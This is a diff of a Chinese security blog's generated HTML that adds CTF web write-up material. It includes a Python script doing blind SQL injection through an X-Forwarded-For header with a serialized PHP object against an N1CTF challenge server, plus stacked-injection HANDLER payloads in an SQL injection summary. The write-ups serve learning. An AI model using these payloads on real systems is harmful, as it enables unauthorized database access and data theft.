@@ -108,7 +108,7 @@
 <p>2.关于stristr()</p>
 <p>这个函数是不区分大小写的strstr()，即不区分大小写查询字符串，如果传参是一个实例对象，那就会自动调用__toString先转成字符串。</p>
 <p>（二）解题思路</p>
-<p>正好__wakeup()里还有这么一句：<code>if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)</code>可以让我们通过stristr()调用__toString().反序列化this-&gt;ip为new ip()，在new ip的时候，成员ip就初始化为xxf了<del>再利用stristr()调用this-&gt;ip里的__toString()，然后利用xff报错注入来进行布尔盲注</del></p>
+<p>正好__wakeup()里还有这么一句：<code>if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False)</code>可以让我们通过stristr()调用__toString().反序列化this-&gt;ip为new ip()，在new ip的时候，成员ip就初始化为xxf~再利用stristr()调用this-&gt;ip里的__toString()，然后利用xff报错注入来进行布尔盲注~</p>
 <p>payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">word &#x3D; &#39;1234567890qwertyuioplkjhgfdsazxcvbnm&#39;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;101.32.205.189&#x2F;?input&#x3D;O:4:&quot;flag&quot;:1:&#123;s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:0:&#123;&#125;&#125;&#39;</span><br><span class="line">for a in range(1,50):</span><br><span class="line">    for ch in word:</span><br><span class="line">        payload &#x3D; f&#39;\&#39; or updatexml(1,concat(0x7e,(select if((substring((select &#96;key&#96; from n1key),&#123;a&#125;,1)&#x3D;\&#39;&#123;ch&#125;\&#39;),\&#39;n1ctf\&#39;,0)),0x7e),1) or \&#39;&#39;</span><br><span class="line">        &#x2F;&#x2F;ps:因为payload中的语句是在__toString中执行的，所以最后的错误信息会给ip成员</span><br><span class="line"></span><br><span class="line">        sess &#x3D; requests.session()</span><br><span class="line">        head &#x3D; &#123;&#39;X-Forwarded-for&#39;: payload&#125;</span><br><span class="line">        resp &#x3D; sess.get(url, headers&#x3D;head)</span><br><span class="line">        if &#39;&lt;code&gt;welcome to n1ctf2020&lt;&#x2F;code&gt;&#39; in resp.text:</span><br><span class="line">            # print(str(a) + &#39;: &#39; + ch)</span><br><span class="line">            print(ch, end&#x3D;&#39;&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -137,7 +137,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckgjbpcqf0000g8v0c11jaxv9" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/20/N1CTF-Web%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckgjdkn2m00009ov09xsld2li" class="article-share-link">Share</a>
       
       
     </footer>
@@ -193,7 +193,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckgjbpcqt0004g8v0hul59pwr" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/19/%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93/" data-id="ckgjdkn2v00049ov06nvm4mcm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -232,7 +232,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/17/tp5%E6%BC%8F%E6%B4%9E/" data-id="ckgjbpcqm0002g8v0fh91czjx" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/17/tp5%E6%BC%8F%E6%B4%9E/" data-id="ckgjdkn2u00039ov0ha3v5qfa" class="article-share-link">Share</a>
       
       
     </footer>
@@ -287,6 +287,11 @@
 <p>堆叠注入:1’;show columns from 表名;#</p>
 <p>(5)爆出数据</p>
 <p>联合查询:1’ union select 列名1, 列名2 from 表名#</p>
+<p>堆叠注入:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;</span><br><span class="line">HANDLER 表名 OPEN;</span><br><span class="line">HANDLER 表名 READ FIRST;</span><br><span class="line">HANDLER 表名 CLOSE;#</span><br></pre></td></tr></table></figure>
+
+
+
 <p>二、绕过</p>
 <p>很多时候会发现，上面的步骤好像并没有那么顺利。“别黑了”、“stop hacking!”类似这种黑话见到早就不止一次了QAQ。因为现在哪还有那么友好的出题人出题是为了让你按照公式直接秒的，大多时候出题人都设置了白名单过滤，一旦你输入的payload被检测到匹配白名单中的某一项，注入就失败了。下面总结一下见过的白名单过滤以及绕过方法。</p>
 <p>(1)过滤关键字</p>
@@ -330,6 +335,10 @@
 <p>比如如果我们使用?id=0e1union select 1,2</p>
 <p>后端就变成了 SELECT user,password from users where user_id=0 union select 1,2//0e1变成0后面自动补了个空格为了区分后面的内容，但是白名单过滤的时候是区分不出来的，白名单只会认为0e1union是一个字符串，真正开始查询的时候0e1才会变成0+空格</p>
 <p>因此如果白名单中有union，那么通过科学计数法，union就可以顺利绕过过滤了</p>
+<p>三、报错注入</p>
+<p>目前只用过updatexml()报错注入QAQ。有关内容在N1CTFWeb那篇文章写的很细了</p>
+<p>直接放个题感受一下吧。。。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12311408.html">Here！</a></p>
 <p>目前知道的知识点就这些，之后随缘补充吧233</p>
 <p>参考网站：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hhwu/p/12622048.html">常规步骤参考1</a></p>
@@ -338,7 +347,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckgjbpcqk0001g8v08a8t2bij" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/14/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%BB%E7%BB%93/" data-id="ckgjdkn2s00019ov0hakuby7b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -396,7 +405,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckgjbpcqs0003g8v00f2q2ksx" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/10/08/%E5%85%B3%E4%BA%8EPHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8C%E4%B8%80%E4%BA%9B%E5%B0%8F%E7%BB%86%E8%8A%82/" data-id="ckgjdkn2t00029ov052il2o5o" class="article-share-link">Share</a>
       
       
     </footer>
